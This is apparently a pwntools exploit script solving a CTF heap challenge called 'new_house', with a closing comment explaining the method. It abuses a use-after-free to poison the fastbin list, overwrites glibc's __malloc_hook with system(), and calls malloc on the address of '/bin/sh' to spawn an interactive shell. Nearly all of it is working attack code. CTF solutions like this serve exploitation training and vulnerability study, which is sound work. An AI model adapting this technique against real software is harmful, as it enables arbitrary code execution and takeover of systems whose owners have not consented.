from pwn import *
import warnings

warnings.simplefilter("ignore", category = BytesWarning)
context.update(os = "linux", arch = "amd64")
elf = context.binary = ELF("new_house")
libc = ELF("libc.so.6")

if (args.REMOTE):
	# p = remote("flu.xxx", 10170)
	p = remote("127.0.0.1", 12345)
else:
	p = elf.process()
	# gdb.attach(p)
	# pause()

p.recvuntil("ground: ")
libc.address = int(p.recvuntil("\n"), 16)
log.info("libc base = " + hex(libc.address))

def malloc(size, name):
	p.sendlineafter(">>> ", b"1")
	p.sendafter("name? ", name)
	p.sendlineafter("size? ", str(size))

def free(index):
	p.sendlineafter(">>> ", b"2")
	p.sendlineafter("number? ", str(index))

def design(index, content):
	p.sendlineafter(">>> ", b"3")
	p.sendlineafter("number? ", str(index))
	p.sendafter("room? ", content)

malloc(0x68, b"AAAA")	# chunk_A
free(0)
design(0, p64(libc.sym["__malloc_hook"] - 0x23))
malloc(0x68, b"BBBB")	# This will be at the same location as chunk_A
malloc(0x68, b"CCCC")	# This chunk will be at the arbitrary location we write into chunk_A->FD
design(2, b"A" * 0x13 + p64(libc.sym["system"]))
malloc(next(libc.search(b"/bin/sh")), b"DDDD")

p.interactive()

# We are allowed to malloc chunks of arbitrary size and also free one chunk.
# We can also edit the content of any chunk we like. However, this doesn't check
# if the chunk is already free'd so it is a UAF. We will allocate a fastbin of size 0x70
# and then free it. Then, we overwrite its FD pointer and malloc a new 0x70 chunk to
# point the fastbins head at that arbitrary location and next time malloc will return that location
# (if the size metadata is correct at that location). We will use 0x23 bytes before __malloc_hook
# which has correct size metadata (although it is unaligned, which doesn't matter). Then we overwrite
# __malloc_hook with system() and pass the location of /bin/sh to malloc next time we're calling it.
